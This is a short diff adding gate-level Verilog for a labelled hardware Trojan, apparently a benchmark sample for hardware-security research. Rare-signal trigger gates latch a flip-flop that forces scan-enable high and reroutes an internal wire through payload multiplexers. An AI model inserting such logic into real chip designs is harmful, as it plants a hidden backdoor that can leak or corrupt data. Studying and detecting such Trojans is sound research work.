@@ -1,0 +1,15 @@
+AND2X1 Trojan1 (.IN1(WX742), .IN2(WX7249), .Q(Tj_OUT1));
+AND2X1 Trojan2 (.IN1(WX5922), .IN2(WX5960), .Q(Tj_OUT2));
+AND2X1 Trojan3 (.IN1(WX4697), .IN2(WX9032), .Q(Tj_OUT3));
+AND2X1 Trojan4 (.IN1(WX8298), .IN2(WX10846), .Q(Tj_OUT4));
+NOR4X0 Trojan1234_NOT (.IN1(Tj_OUT1), .IN2(Tj_OUT1), .IN3(Tj_OUT3), .IN4(Tj_OUT4), .QN(Tj_OUT1234));
+AND2X1 Trojan5 (.IN1(WX3340), .IN2(WX6476), .Q(Tj_OUT5));
+AND2X1 Trojan6 (.IN1(WX9819), .IN2(WX1813), .Q(Tj_OUT6));
+AND2X1 Trojan7 (.IN1(WX5710), .IN2(WX3458), .Q(Tj_OUT7));
+AND2X1 Trojan8 (.IN1(WX9060), .IN2(WX7749), .Q(Tj_OUT8));
+NOR4X0 Trojan5678_NOT (.IN1(Tj_OUT5), .IN2(Tj_OUT6), .IN3(Tj_OUT7), .IN4(Tj_OUT8), .QN(Tj_OUT5678));
+INVX0 INV_test_se( .IN(test_se), .QN(test_se_NOT) );  
+AND3X1 Trojan_Trigger ( .IN1(Tj_OUT1234), .IN2(Tj_OUT5678), .IN3(test_se_NOT), .Q(Tj_Trigger) );
+DFFX2 TrojanScanEnable ( .CLK(Tj_Trigger), .D(1'b1), .Q(Trojan_SE) );
+MUX21X1 Trojan_Payload1 (.IN1(test_se), .IN2(1'b1), .S(Trojan_SE), .Q(test_se_Trojan));
+MUX21X1 Trojan_Payload2 (.IN1(WX11155), .IN2(WX3442), .S(Trojan_SE), .Q(WX11155_Tj_Payload));
